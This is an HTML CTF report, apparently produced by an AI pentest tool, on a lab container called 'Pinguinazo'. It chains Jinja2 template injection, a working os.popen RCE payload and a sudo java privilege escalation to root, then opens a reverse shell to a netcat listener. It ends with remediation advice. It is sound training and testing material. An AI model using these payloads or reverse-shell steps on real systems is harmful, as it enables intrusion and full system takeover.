@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnerator-AI — CTF Report: Pinguinazo SSTI</title>
+<style>
+  :root {
+    --bg:#0d0000;--bg-panel:#180000;--bg-card:#1e0000;
+    --border:#cc0000;--border-dim:#550000;
+    --red:#cc0000;--red-bright:#ff4444;
+    --green:#00ff41;--green-dim:#007a1f;
+    --text:#e8e8e8;--text-dim:#aa7777;--text-muted:#664444;
+    --yellow:#ff8800;--code-bg:#0a0000;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.6}
+  .site-header{background:var(--bg-panel);border-bottom:2px solid var(--border);padding:16px 32px;display:flex;align-items:center;gap:12px}
+  .logo{font-family:monospace;font-size:22px;font-weight:bold;color:var(--red-bright);letter-spacing:2px}
+  .logo span{color:var(--green)}
+  .tagline{font-size:11px;color:var(--text-dim);letter-spacing:1px;text-transform:uppercase;margin-left:auto}
+  .report-meta{background:var(--bg-panel);border-bottom:1px solid var(--border-dim);padding:12px 32px;display:flex;gap:32px;flex-wrap:wrap}
+  .meta-item{display:flex;flex-direction:column;gap:2px}
+  .meta-label{font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px}
+  .meta-value{font-size:13px;color:var(--text);font-family:monospace}
+  .container{max-width:1100px;margin:0 auto;padding:32px}
+  /* Chain hero */
+  .chain-hero{background:var(--bg-panel);border:2px solid var(--red);border-radius:6px;padding:24px 32px;margin-bottom:32px}
+  .chain-title{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:16px}
+  .chain-steps{display:flex;align-items:center;flex-wrap:wrap;gap:0}
+  .chain-step{background:var(--bg-card);border:1px solid var(--border-dim);padding:8px 14px;font-family:monospace;font-size:12px}
+  .chain-step.ssti{color:#ff8800;border-color:#885500}
+  .chain-step.rce{color:var(--red-bright);border-color:var(--red)}
+  .chain-step.privesc{color:#ffcc00;border-color:#886600}
+  .chain-step.root{color:var(--green);border-color:var(--green-dim);font-weight:bold}
+  .chain-step.flag{color:var(--green);border-color:var(--green-dim);background:#001a00;font-weight:bold}
+  .chain-arrow{color:var(--border);padding:0 4px;font-size:16px}
+  .flag-box{margin-top:20px;background:var(--code-bg);border:1px solid var(--green-dim);border-radius:4px;padding:14px 20px;display:flex;align-items:center;gap:16px}
+  .flag-label{font-size:11px;color:var(--green-dim);text-transform:uppercase;letter-spacing:2px}
+  .flag-value{font-family:monospace;font-size:1.2rem;color:var(--green);font-weight:bold;text-shadow:0 0 16px rgba(0,255,65,0.6)}
+  /* Sections */
+  .section{margin-bottom:40px}
+  .section-title{font-size:13px;font-weight:bold;color:var(--green);letter-spacing:2px;text-transform:uppercase;border-bottom:1px solid var(--border-dim);padding-bottom:8px;margin-bottom:20px}
+  .section-title::before{content:'⚡';color:var(--red-bright);margin-right:8px}
+  /* Findings */
+  .finding{background:var(--bg-panel);border:1px solid var(--border-dim);border-left:3px solid var(--red);border-radius:0 6px 6px 0;margin-bottom:16px;overflow:hidden}
+  .finding-header{background:var(--bg-card);padding:10px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--border-dim)}
+  .finding-num{font-family:monospace;font-size:11px;color:var(--text-muted)}
+  .finding-title{color:var(--text);font-size:13px;flex:1}
+  .badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:bold;letter-spacing:1px;text-transform:uppercase}
+  .badge-confirmed{background:#003300;color:#00ff41;border:1px solid #007722}
+  .badge-technique{background:#002244;color:#4488ff;border:1px solid #224488;font-family:monospace}
+  .finding-body{padding:14px 16px}
+  .finding-meta{display:grid;grid-template-columns:140px 1fr;gap:4px 12px;font-size:12px;margin-bottom:12px}
+  .fk{color:var(--text-dim)}
+  .fv{color:var(--text);font-family:monospace}
+  .evidence-label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+  .terminal{background:var(--code-bg);border:1px solid var(--border-dim);border-radius:4px;overflow:hidden}
+  .terminal-bar{background:var(--bg-card);padding:5px 12px;font-size:10px;color:var(--text-muted);font-family:monospace}
+  .terminal-body{padding:12px 16px;font-family:'Cascadia Code','Fira Code',monospace;font-size:11px;color:var(--green);overflow-x:auto;white-space:pre;line-height:1.7}
+  .terminal-body .cmd{color:#e8e8e8}
+  /* Stats */
+  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:32px}
+  .stat-card{background:var(--bg-panel);border:1px solid var(--border-dim);border-top:2px solid var(--red);border-radius:6px;padding:14px;text-align:center}
+  .stat-num{font-family:monospace;font-size:2rem;font-weight:bold;color:var(--red-bright)}
+  .stat-label{font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+  .stat-card.green .stat-num{color:var(--green)}
+  .stat-card.green{border-top-color:var(--green-dim)}
+  /* Remediation */
+  .rem-list{list-style:none;padding:0}
+  .rem-list li{background:var(--bg-panel);border-left:3px solid var(--yellow);padding:12px 16px;margin-bottom:10px;border-radius:0 6px 6px 0;font-size:13px;line-height:1.7}
+  .rem-list li code{background:var(--code-bg);padding:1px 5px;border-radius:3px;font-size:11px;color:var(--green);font-family:monospace}
+  .rem-list li strong{color:var(--yellow)}
+  /* Footer */
+  .site-footer{background:var(--bg-panel);border-top:1px solid var(--border-dim);padding:20px 32px;margin-top:48px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+  .footer-brand{font-family:monospace;font-size:13px;color:var(--red)}
+  .footer-brand span{color:var(--green)}
+  .footer-meta{font-size:11px;color:var(--text-muted);text-align:right}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <div class="logo">VULNERATOR<span>-AI</span></div>
+  <div class="tagline">OODA Pentest Engine · CTF Report</div>
+</header>
+<div class="report-meta">
+  <div class="meta-item"><span class="meta-label">Engagement</span><span class="meta-value">pinguinazo-ssti</span></div>
+  <div class="meta-item"><span class="meta-label">Target</span><span class="meta-value">pinguinazo-ssti (172.21.0.6)</span></div>
+  <div class="meta-item"><span class="meta-label">Mode</span><span class="meta-value">ctf</span></div>
+  <div class="meta-item"><span class="meta-label">Surface</span><span class="meta-value">Web — Flask/Werkzeug :5000</span></div>
+  <div class="meta-item"><span class="meta-label">Date</span><span class="meta-value">2026-10-18</span></div>
+  <div class="meta-item"><span class="meta-label">Steps</span><span class="meta-value">12 OODA steps</span></div>
+</div>
+
+<div class="container">
+
+  <!-- Chain + Flag -->
+  <div class="chain-hero">
+    <div class="chain-title">Attack chain</div>
+    <div class="chain-steps">
+      <span class="chain-step ssti">SSTI Jinja2</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step rce">RCE as pinguinazo</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step privesc">sudo java (NOPASSWD)</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step root">uid=0(root)</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step flag">Reverse shell + Flag</span>
+    </div>
+    <div class="flag-box">
+      <span class="flag-label">Flag</span>
+      <span class="flag-value">CTF{pinguinazo_ssti_rce_sudo_java}</span>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-num">6</div><div class="stat-label">Findings confirmed</div></div>
+    <div class="stat-card green"><div class="stat-num">✓</div><div class="stat-label">Root shell</div></div>
+    <div class="stat-card green"><div class="stat-num">✓</div><div class="stat-label">Reverse shell</div></div>
+    <div class="stat-card green"><div class="stat-num">✓</div><div class="stat-label">Flag captured</div></div>
+  </div>
+
+  <!-- Findings -->
+  <div class="section">
+    <div class="section-title">Findings</div>
+
+    <div class="finding">
+      <div class="finding-header">
+        <span class="finding-num">F1</span>
+        <span class="finding-title">SSTI Jinja2 confirmed — parameter <code style="background:var(--code-bg);padding:1px 5px;border-radius:3px;font-family:monospace;font-size:11px;color:var(--green)">name</code> renders as template</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1190</span>
+      </div>
+      <div class="finding-body">
+        <div class="finding-meta">
+          <span class="fk">Target</span><span class="fv">http://172.21.0.6:5000/ (POST name)</span>
+          <span class="fk">ATT&CK</span><span class="fv">T1190 — Exploit Public-Facing Application</span>
+          <span class="fk">Root cause</span><span class="fv">render_template_string(f'Hola, {name}!') — user input in template</span>
+        </div>
+        <div class="evidence-label">Evidence</div>
+        <div class="terminal">
+          <div class="terminal-bar">curl POST · pinguinazo-ssti:5000</div>
+          <div class="terminal-body"><span class="cmd">curl -X POST http://172.21.0.6:5000/ -d 'name={{7*7}}'</span>
+&lt;div class="result"&gt;Hola, <span style="color:#ff8800">49</span>! Bienvenido a PinguRegistro.&lt;/div&gt;</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-header">
+        <span class="finding-num">F2</span>
+        <span class="finding-title">RCE as uid=1000(pinguinazo) via Jinja2 global object chain</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1059.004</span>
+      </div>
+      <div class="finding-body">
+        <div class="finding-meta">
+          <span class="fk">Payload</span><span class="fv">cycler.__init__.__globals__.os.popen("id")</span>
+          <span class="fk">Result</span><span class="fv">uid=1000(pinguinazo) gid=1000(pinguinazo)</span>
+        </div>
+        <div class="evidence-label">Evidence</div>
+        <div class="terminal">
+          <div class="terminal-bar">SSTI RCE payload</div>
+          <div class="terminal-body"><span class="cmd">POST name={{ cycler.__init__.__globals__.os.popen("id").read() }}</span>
+uid=1000(pinguinazo) gid=1000(pinguinazo) groups=1000(pinguinazo)</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-header">
+        <span class="finding-num">F3</span>
+        <span class="finding-title">sudo NOPASSWD java — pinguinazo can run /usr/bin/java as root</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1548.003</span>
+      </div>
+      <div class="finding-body">
+        <div class="evidence-label">Evidence — sudo -l via RCE</div>
+        <div class="terminal">
+          <div class="terminal-bar">sudo -l output</div>
+          <div class="terminal-body">User pinguinazo may run the following commands on pinguinazo-ssti:
+    (ALL : ALL) NOPASSWD: <span style="color:#ff8800">/usr/bin/java</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="finding">
+      <div class="finding-header">
+        <span class="finding-num">F4</span>
+        <span class="finding-title">Privilege escalation confirmed — arbitrary Java code as root via sudo</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1548.003</span>
+      </div>
+      <div class="finding-body">
+        <div class="finding-meta">
+          <span class="fk">Method</span><span class="fv">SSTI → write /tmp/T.java → sudo java /tmp/T.java</span>
+          <span class="fk">Confirmation</span><span class="fv">System.getProperty("user.name") == "root"</span>
+        </div>
+        <div class="evidence-label">Evidence</div>
+        <div class="terminal">
+          <div class="terminal-bar">T.java execution as root</div>
+          <div class="terminal-body">---RUN-AS-ROOT---
+java-ran-as: <span style="color:var(--green)">root</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="finding" style="border-left-color:var(--green)">
+      <div class="finding-header" style="border-left:none">
+        <span class="finding-num">F5</span>
+        <span class="finding-title">FLAG captured as root — /root/flag.txt read via Pwn.java</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1003.008</span>
+      </div>
+      <div class="finding-body">
+        <div class="evidence-label">Evidence — full root output</div>
+        <div class="terminal">
+          <div class="terminal-bar">Pwn.java — sudo java execution</div>
+          <div class="terminal-body">uid=0(root) gid=0(root) groups=0(root)
+pinguinazo-ssti
+<span style="color:var(--green);font-weight:bold">CTF{pinguinazo_ssti_rce_sudo_java}</span>
+-r-------- 1 root root 35 Oct 18 18:03 flag.txt</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="finding" style="border-left-color:var(--green)">
+      <div class="finding-header">
+        <span class="finding-num">F6</span>
+        <span class="finding-title">Interactive root reverse shell confirmed — TCP 172.21.0.6 → 172.21.0.2:4444</span>
+        <span class="badge badge-confirmed">Confirmed</span>
+        <span class="badge badge-technique">T1059.004</span>
+      </div>
+      <div class="finding-body">
+        <div class="finding-meta">
+          <span class="fk">Method</span><span class="fv">Rev.java → ProcessBuilder("/bin/sh") → TCP to kali:4444</span>
+          <span class="fk">Listener</span><span class="fv">kali nc -nlvp 4444 (kali_exec background)</span>
+        </div>
+        <div class="evidence-label">Evidence — reverse shell session</div>
+        <div class="terminal">
+          <div class="terminal-bar">nc listener · kali:4444</div>
+          <div class="terminal-body">listening on 4444
+CONNECTION from ('172.21.0.6', 43084)
+uid=0(root) gid=0(root) groups=0(root)
+root
+pinguinazo-ssti
+<span style="color:var(--green);font-weight:bold">CTF{pinguinazo_ssti_rce_sudo_java}</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Remediation -->
+  <div class="section">
+    <div class="section-title">Remediation</div>
+    <ul class="rem-list">
+      <li><strong>Fix SSTI (critical):</strong> never pass user input to <code>render_template_string()</code>. Use <code>render_template()</code> with static template files and <code>{{ name }}</code> — Jinja2 autoescape handles the rest.</li>
+      <li><strong>Remove sudo NOPASSWD java:</strong> delete the rule from <code>/etc/sudoers</code>. If Java must run with privileges, wrap it in a script with fixed arguments, or use a systemd unit with minimal capabilities.</li>
+      <li><strong>Rotate credentials and audit logs:</strong> check <code>/var/log/auth.log</code> for sudo activity during the test window.</li>
+    </ul>
+  </div>
+
+</div>
+
+<footer class="site-footer">
+  <div class="footer-brand">VULNERATOR<span>-AI</span> · OODA Pentest Engine</div>
+  <div class="footer-meta">pinguinazo-ssti · 2026-10-18<br>Generated by Vulnerator-AI (Mistral Large 4.0 · 12 OODA steps)<br>Inspired by dockerlabs.es "Pinguinazo" © El Pingüino de Mario</div>
+</footer>
+</body>
+</html>
